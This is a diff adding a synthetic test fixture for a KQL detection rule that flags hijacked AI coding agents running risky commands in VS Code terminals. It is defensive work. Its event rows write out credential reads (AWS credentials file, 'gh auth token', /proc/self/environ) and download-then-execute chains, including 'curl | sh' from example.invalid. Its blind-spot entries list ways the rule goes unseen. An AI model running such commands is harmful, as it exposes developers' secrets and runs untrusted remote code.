@@ -1,0 +1,238 @@
+schema: umbrasec.claims/v1
+rule: queries/kql/editor-terminal-risky-command.kql
+rule_id: null
+rule_sha256: 130890d5e5671a810b1b33ab27b656cc5e0db4ae115f90458fa9954b0a5cb798
+engine: kusto
+writeup: research/detecting-hijacked-ai-coding-agents.html
+reviewed: 2026-10-26
+# Not executed: there is no Kusto engine in CI yet. Every event is one row of
+# DeviceProcessEvents for a child of a terminal shell. By default that shell is a
+# PowerShell 7 terminal in VS Code on Windows: the pty host Code.exe is the grandparent
+# and the shell command line is the one VS Code's own source builds for shell
+# integration (src/vs/platform/terminal/node/terminalEnvironment.ts at af3b54d). Events
+# that sit in another shell override the shell fields. Git Bash events are shapes only:
+# whether Defender shows a Git Bash command as a direct child of the terminal bash.exe is
+# not confirmed, so no coverage claim rests on them alone. No event comes from a lab
+# capture: the column names are Microsoft's, the values are assumed. The pairing claims
+# use mode: sequence, because a pair needs both children in one table.
+# The query passed Kusto.Language 12.4.1 (Microsoft's parser) with 0 diagnostics
+# against a DeviceProcessEvents schema holding every column it reads.
+event_defaults:
+  _synthetic: true
+  DeviceId: "0000000000000000000000000000000000000a01"
+  DeviceName: devbox-01.example.com
+  AccountName: dev
+  InitiatingProcessParentFileName: Code.exe
+  InitiatingProcessCommandLine: '"C:\Program Files\PowerShell\7\pwsh.exe" -noexit -command "try { . \"c:\Users\dev\AppData\Local\Programs\Microsoft VS Code\1a2b3c4d5e\resources\app\out\vs\workbench\contrib\terminal\common\scripts\shellIntegration.ps1\" } catch {}"'
+  InitiatingProcessId: 7200
+  InitiatingProcessCreationTime: "2026-10-26T09:00:00Z"
+claims:
+  - id: catches/terminal-credential-read
+    kind: catches
+    quote: {source: rule, text: "Credential: a child whose command line contains a CredentialMarkers string"}
+    expect: match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: a cmd child types the AWS credentials file", Timestamp: "2026-10-26T09:05:00Z", FileName: cmd.exe, ProcessId: 7310, ProcessCommandLine: '"C:\Windows\system32\cmd.exe" /c type C:\Users\dev\.aws\credentials'}
+      - {_note: "PowerShell terminal: gh prints the GitHub token; PowerShell records the quoted full path (inferred, not captured)", Timestamp: "2026-10-26T09:05:10Z", FileName: gh.exe, ProcessId: 7330, ProcessCommandLine: '"C:\Program Files\GitHub CLI\gh.exe" auth token'}
+  - id: catches/gh-from-powershell-inferred-form
+    kind: catches
+    quote: {source: rule, text: "PowerShell records a native program's command line as its quoted full path, so gh auth token typed there is matched as gh.exe\" auth token."}
+    expect: match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "only the added marker matches: the line does not contain gh auth token", Timestamp: "2026-10-26T09:05:20Z", FileName: gh.exe, ProcessId: 7331, ProcessCommandLine: '"C:\Program Files\GitHub CLI\gh.exe" auth token --hostname github.com'}
+  - id: catches/gh-from-git-bash-inferred-form
+    kind: catches
+    quote: {source: rule, text: "Git Bash quotes the path only when it holds a space, so gh on a path without one is matched as gh.exe auth token."}
+    expect: match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "only the unquoted marker matches: gh on a path without a space, started from Git Bash (inferred from the msys2 runtime, not captured)", Timestamp: "2026-10-26T09:05:30Z", FileName: gh.exe, ProcessId: 7332, ProcessCommandLine: 'C:\Users\dev\scoop\shims\gh.exe auth token --hostname github.com'}
+  - id: catches/proc-environ
+    kind: catches
+    quote: {source: rule, text: "or /proc/ together with /environ followed by a space, a quote, ;, ) or the end of the line"}
+    expect: match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: wsl.exe reads a Linux process environment; the line ends in /environ", Timestamp: "2026-10-26T09:06:00Z", FileName: wsl.exe, ProcessId: 7340, ProcessCommandLine: '"C:\Windows\system32\wsl.exe" cat /proc/self/environ'}
+      - {_note: "a PID, and /environ followed by a space", Timestamp: "2026-10-26T09:06:10Z", FileName: wsl.exe, ProcessId: 7341, ProcessCommandLine: '"C:\Windows\system32\wsl.exe" strings /proc/1234/environ | sort'}
+  - id: catches/terminal-download-then-interpreter
+    kind: catches
+    quote: {source: rule, text: "a child whose command line contains a DownloadTools string, then a different child whose process name is in Interpreters, starting 0 to PairWindow (60 seconds) later"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: curl.exe saves a script", Timestamp: "2026-10-26T09:10:00Z", FileName: curl.exe, ProcessId: 7400, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -o C:\Users\dev\AppData\Local\Temp\x.ps1 https://example.invalid/x.ps1'}
+      - {_note: "the same shell runs it with Windows PowerShell 20 seconds later", Timestamp: "2026-10-26T09:10:20Z", FileName: powershell.exe, ProcessId: 7401, ProcessCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -File C:\Users\dev\AppData\Local\Temp\x.ps1'}
+  - id: catches/powershell-download-child-then-script
+    kind: catches
+    quote: {source: rule, text: "a child whose command line contains a DownloadTools string, then a different child whose process name is in Interpreters"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: a child powershell process downloads with iwr, so the cmdlet runs in a process of its own", Timestamp: "2026-10-26T09:20:00Z", FileName: powershell.exe, ProcessId: 7500, ProcessCommandLine: 'powershell.exe -NoProfile -Command "iwr https://example.invalid/x.ps1 -OutFile C:\Users\dev\AppData\Local\Temp\x.ps1"'}
+      - {_note: "the same shell runs the script with pwsh 20 seconds later", Timestamp: "2026-10-26T09:20:20Z", FileName: pwsh.exe, ProcessId: 7501, ProcessCommandLine: '"C:\Program Files\PowerShell\7\pwsh.exe" -File C:\Users\dev\AppData\Local\Temp\x.ps1'}
+  - id: catches/python-launcher
+    kind: catches
+    quote: {source: rule, text: "py and py.exe are the Windows Python launcher"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: curl.exe saves a Python script", Timestamp: "2026-10-26T09:25:00Z", FileName: curl.exe, ProcessId: 7550, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -o x.py https://example.invalid/x.py'}
+      - {_note: "the py launcher runs it 15 seconds later", Timestamp: "2026-10-26T09:25:15Z", FileName: py.exe, ProcessId: 7551, ProcessCommandLine: '"C:\Windows\py.exe" x.py'}
+  - id: catches/git-bash-shape-if-direct-child
+    kind: catches
+    quote: {source: rule, text: "Git Bash's bash.exe gets the same --init-file marker, but its process tree is not confirmed"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "the shape only: matches if the sensor shows curl as a direct child of the terminal bash.exe, which is not confirmed", Timestamp: "2026-10-26T09:28:00Z", InitiatingProcessCommandLine: '"C:\Program Files\Git\bin\bash.exe" --init-file "c:\Users\dev\AppData\Local\Programs\Microsoft VS Code\1a2b3c4d5e\resources\app\out\vs\workbench\contrib\terminal\common\scripts/shellIntegration-bash.sh"', InitiatingProcessId: 7300, InitiatingProcessCreationTime: "2026-10-26T09:01:00Z", FileName: curl.exe, ProcessId: 7570, ProcessCommandLine: "curl -o /tmp/x.sh https://example.invalid/x.sh"}
+      - {_note: "the same shell runs it with sh 20 seconds later", Timestamp: "2026-10-26T09:28:20Z", InitiatingProcessCommandLine: '"C:\Program Files\Git\bin\bash.exe" --init-file "c:\Users\dev\AppData\Local\Programs\Microsoft VS Code\1a2b3c4d5e\resources\app\out\vs\workbench\contrib\terminal\common\scripts/shellIntegration-bash.sh"', InitiatingProcessId: 7300, InitiatingProcessCreationTime: "2026-10-26T09:01:00Z", FileName: sh.exe, ProcessId: 7571, ProcessCommandLine: "sh /tmp/x.sh"}
+  - id: catches/pipe-download-recorded-first
+    kind: catches
+    quote: {source: rule, text: "it pairs only when the download tool is recorded first"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: curl.exe piped into powershell, curl recorded first", Timestamp: "2026-10-26T09:30:00.000Z", FileName: curl.exe, ProcessId: 7600, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -s https://example.invalid/x.ps1'}
+      - {_note: "the pipe's reader, 10 ms later", Timestamp: "2026-10-26T09:30:00.010Z", FileName: powershell.exe, ProcessId: 7601, ProcessCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -'}
+  - id: near-miss/pair-outside-window
+    kind: near-miss
+    rationale: "The interpreter starts 5 minutes after the download, outside the 60-second PairWindow"
+    expect: no-match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {Timestamp: "2026-10-26T09:10:00Z", FileName: curl.exe, ProcessId: 7400, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -o C:\Users\dev\AppData\Local\Temp\x.ps1 https://example.invalid/x.ps1'}
+      - {Timestamp: "2026-10-26T09:15:00Z", FileName: powershell.exe, ProcessId: 7401, ProcessCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -File C:\Users\dev\AppData\Local\Temp\x.ps1'}
+  - id: near-miss/pair-different-shells
+    kind: near-miss
+    rationale: "The download is in one terminal shell and the interpreter in another on the same device; a pair must share InitiatingProcessId and InitiatingProcessCreationTime"
+    expect: no-match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "shell 7200 (PowerShell terminal) downloads", Timestamp: "2026-10-26T09:40:00Z", FileName: curl.exe, ProcessId: 7700, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -o C:\Users\dev\AppData\Local\Temp\x.ps1 https://example.invalid/x.ps1'}
+      - {_note: "a second PowerShell terminal, shell 7250, runs a script 20 seconds later", Timestamp: "2026-10-26T09:40:20Z", InitiatingProcessId: 7250, InitiatingProcessCreationTime: "2026-10-26T09:02:00Z", FileName: powershell.exe, ProcessId: 7701, ProcessCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -File C:\Users\dev\AppData\Local\Temp\x.ps1'}
+  - id: near-miss/interpreter-before-download
+    kind: near-miss
+    rationale: "The interpreter starts 20 seconds before the download; only an interpreter that starts after a download pairs"
+    expect: no-match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {Timestamp: "2026-10-26T09:50:00Z", FileName: python.exe, ProcessId: 7800, ProcessCommandLine: "python -m pytest"}
+      - {Timestamp: "2026-10-26T09:50:20Z", FileName: curl.exe, ProcessId: 7801, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -o C:\Users\dev\AppData\Local\Temp\x.ps1 https://example.invalid/x.ps1'}
+  - id: near-miss/single-child-never-pairs-with-itself
+    kind: near-miss
+    rationale: "One interpreter child whose own command line names a download tool is one process; the pairing needs a different child"
+    expect: no-match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {Timestamp: "2026-10-26T10:00:00Z", FileName: python.exe, ProcessId: 7900, ProcessCommandLine: "python scripts/curl_smoke_test.py"}
+  - id: near-miss/ordinary-terminal-work
+    kind: near-miss
+    rationale: "Ordinary agent or developer work in one terminal within a minute: git, an npm test run under node, pytest and a read of the project's .env file; no download tool, no listed credential source"
+    expect: no-match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {Timestamp: "2026-10-26T10:10:00Z", FileName: git.exe, ProcessId: 8000, ProcessCommandLine: "git status --short"}
+      - {Timestamp: "2026-10-26T10:10:05Z", FileName: node.exe, ProcessId: 8001, ProcessCommandLine: '"C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs\node_modules\npm\bin\npm-cli.js" test'}
+      - {Timestamp: "2026-10-26T10:10:20Z", FileName: python.exe, ProcessId: 8002, ProcessCommandLine: "python -m pytest -q"}
+      - {Timestamp: "2026-10-26T10:10:30Z", FileName: cmd.exe, ProcessId: 8003, ProcessCommandLine: '"C:\Windows\system32\cmd.exe" /c type .env'}
+  - id: near-miss/plain-terminal-no-editor
+    kind: near-miss
+    rationale: "A credential read in a shell whose parent is not an editor and whose command line has no shell-integration marker"
+    expect: no-match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell started from the Start menu", Timestamp: "2026-10-26T10:20:00Z", InitiatingProcessParentFileName: explorer.exe, InitiatingProcessCommandLine: '"C:\Program Files\PowerShell\7\pwsh.exe"', InitiatingProcessId: 8100, FileName: cmd.exe, ProcessId: 8101, ProcessCommandLine: '"C:\Windows\system32\cmd.exe" /c type C:\Users\dev\.aws\credentials'}
+      - {_note: "a Linux desktop terminal", Timestamp: "2026-10-26T10:20:00Z", DeviceName: devbox-02.example.com, InitiatingProcessParentFileName: gnome-terminal-server, InitiatingProcessCommandLine: "bash", InitiatingProcessId: 8200, FileName: cat, ProcessId: 8201, ProcessCommandLine: "cat /home/dev/.aws/credentials"}
+  - id: near-miss/extension-host-shell
+    kind: near-miss
+    rationale: "A shell spawned straight from the extension host (Roo Code's default mode, any extension) has no shell-integration marker on its command line; Detection 2 covers that path"
+    expect: no-match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "the cmd.exe itself: its parent is the extension host Code.exe", Timestamp: "2026-10-26T10:30:00Z", InitiatingProcessCommandLine: '"C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\Code.exe" --type=utility --utility-sub-type=node.mojom.NodeService --dns-result-order=ipv4first --inspect-port=0', InitiatingProcessId: 5100, FileName: cmd.exe, ProcessId: 8300, ProcessCommandLine: 'C:\Windows\system32\cmd.exe /d /s /c "type C:\Users\dev\.aws\credentials"'}
+  - id: blind-spot/linux-editor-not-listed
+    kind: blind-spot
+    quote: {source: rule, text: "The Linux and macOS editor process names are not confirmed, so they are not in Editors"}
+    expect: no-match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "a VS Code bash terminal on Linux; code is a guess at the pty host's name and is not in Editors", Timestamp: "2026-10-26T10:40:00Z", DeviceName: devbox-02.example.com, InitiatingProcessParentFileName: code, InitiatingProcessCommandLine: "/usr/bin/bash --init-file /usr/share/code/resources/app/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh", InitiatingProcessId: 8400, FileName: cat, ProcessId: 8401, ProcessCommandLine: "cat /home/dev/.aws/credentials"}
+  - id: blind-spot/zsh-terminal
+    kind: blind-spot
+    quote: {source: rule, text: "zsh, the macOS default, loads shell integration through ZDOTDIR and has no command-line marker, so a zsh terminal is not seen at all"}
+    expect: no-match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "a macOS zsh terminal; it stays quiet even with the macOS editor name added, because nothing on the zsh command line marks it", Timestamp: "2026-10-26T10:50:00Z", DeviceName: mac-01.example.com, InitiatingProcessParentFileName: Code Helper, InitiatingProcessCommandLine: "/bin/zsh -il", InitiatingProcessId: 8500, FileName: cat, ProcessId: 8501, ProcessCommandLine: "cat /Users/dev/.aws/credentials"}
+  - id: blind-spot/git-bash-intermediate-bash
+    kind: blind-spot
+    quote: {source: rule, text: "so its commands may carry bash.exe rather than Code.exe as their grandparent and not be seen"}
+    expect: no-match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "Git Bash with a bash.exe hop: the cat's parent is a forked bash.exe with the terminal's command line, and its grandparent is the terminal bash.exe", Timestamp: "2026-10-26T10:55:00Z", InitiatingProcessParentFileName: bash.exe, InitiatingProcessCommandLine: '"C:\Program Files\Git\bin\bash.exe" --init-file "c:\Users\dev\AppData\Local\Programs\Microsoft VS Code\1a2b3c4d5e\resources\app\out\vs\workbench\contrib\terminal\common\scripts/shellIntegration-bash.sh"', InitiatingProcessId: 7390, InitiatingProcessCreationTime: "2026-10-26T10:55:00Z", FileName: cat.exe, ProcessId: 7391, ProcessCommandLine: "cat /c/Users/dev/.aws/credentials"}
+  - id: blind-spot/cmd-terminal
+    kind: blind-spot
+    quote: {source: rule, text: "A cmd.exe terminal gets no shell-integration injection and is not seen."}
+    expect: no-match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "a VS Code cmd.exe terminal: the shell command line carries no marker", Timestamp: "2026-10-26T10:58:00Z", InitiatingProcessCommandLine: '"C:\Windows\System32\cmd.exe"', InitiatingProcessId: 7395, InitiatingProcessCreationTime: "2026-10-26T10:57:00Z", FileName: gh.exe, ProcessId: 7396, ProcessCommandLine: '"C:\Program Files\GitHub CLI\gh.exe" auth token'}
+  - id: blind-spot/download-and-interpreter-in-one-child
+    kind: blind-spot
+    quote: {source: rule, text: "A download and an interpreter inside one child, such as bash -c \"curl ... | sh\", are one child and do not pair."}
+    expect: no-match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: one bash -c child; its curl and sh are grandchildren of the terminal shell", Timestamp: "2026-10-26T11:00:00Z", FileName: bash.exe, ProcessId: 8600, ProcessCommandLine: '"C:\Program Files\Git\bin\bash.exe" -c "curl -fsSL https://example.invalid/i.sh | sh"'}
+      - {_note: "the curl grandchild: its parent is the bash -c child, its grandparent the terminal pwsh", Timestamp: "2026-10-26T11:00:00.010Z", InitiatingProcessParentFileName: pwsh.exe, InitiatingProcessCommandLine: '"C:\Program Files\Git\bin\bash.exe" -c "curl -fsSL https://example.invalid/i.sh | sh"', InitiatingProcessId: 8600, InitiatingProcessCreationTime: "2026-10-26T11:00:00Z", FileName: curl.exe, ProcessId: 8601, ProcessCommandLine: "curl -fsSL https://example.invalid/i.sh"}
+      - {_note: "the sh grandchild", Timestamp: "2026-10-26T11:00:00.020Z", InitiatingProcessParentFileName: pwsh.exe, InitiatingProcessCommandLine: '"C:\Program Files\Git\bin\bash.exe" -c "curl -fsSL https://example.invalid/i.sh | sh"', InitiatingProcessId: 8600, InitiatingProcessCreationTime: "2026-10-26T11:00:00Z", FileName: sh.exe, ProcessId: 8602, ProcessCommandLine: "sh"}
+  - id: blind-spot/pipe-interpreter-recorded-first
+    kind: blind-spot
+    quote: {source: rule, text: "In a pipe such as curl ... | sh both children start together and either can be recorded first"}
+    expect: no-match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: the pipe's reader is recorded 5 ms before curl", Timestamp: "2026-10-26T11:10:00.000Z", FileName: powershell.exe, ProcessId: 8701, ProcessCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -'}
+      - {Timestamp: "2026-10-26T11:10:00.005Z", FileName: curl.exe, ProcessId: 8700, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -s https://example.invalid/x.ps1'}
+  - id: false-positive/same-shell-unrelated-interpreter
+    kind: false-positive
+    quote: {source: rule, text: "a download followed by an unrelated interpreter run in the same terminal shell within PairWindow, such as curl fetching a file and then python -m pytest"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "PowerShell terminal: curl.exe fetches a test fixture", Timestamp: "2026-10-26T11:20:00Z", FileName: curl.exe, ProcessId: 8800, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -o tests\fixtures\sample.json https://example.com/sample.json'}
+      - {_note: "the same shell runs the tests 30 seconds later", Timestamp: "2026-10-26T11:20:30Z", FileName: python.exe, ProcessId: 8801, ProcessCommandLine: "python -m pytest"}
+  - id: false-positive/command-names-download-tool
+    kind: false-positive
+    quote: {source: rule, text: "a child that only names a download tool, such as a git commit message that mentions curl, because DownloadTools is matched as a substring"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {Timestamp: "2026-10-26T11:30:00Z", FileName: git.exe, ProcessId: 8900, ProcessCommandLine: 'git commit -m "Retry curl on timeout"'}
+      - {_note: "a build under node 15 seconds later", Timestamp: "2026-10-26T11:30:15Z", FileName: node.exe, ProcessId: 8901, ProcessCommandLine: '"C:\Program Files\nodejs\node.exe" scripts\build.js'}
+  - id: false-positive/names-credential-file
+    kind: false-positive
+    quote: {source: rule, text: "a command that names a credential file without reading it, such as ssh-keygen writing a new key under .ssh or grep searching for .npmrc"}
+    expect: match
+    table: DeviceProcessEvents
+    events:
+      - {Timestamp: "2026-10-26T11:40:00Z", FileName: ssh-keygen.exe, ProcessId: 9000, ProcessCommandLine: '"C:\Windows\System32\OpenSSH\ssh-keygen.exe" -t ed25519 -f C:\Users\dev\.ssh\id_ed25519'}
+      - {_note: "Git's grep started from the PowerShell terminal", Timestamp: "2026-10-26T11:40:10Z", FileName: grep.exe, ProcessId: 9001, ProcessCommandLine: '"C:\Program Files\Git\usr\bin\grep.exe" -rn .npmrc .'}
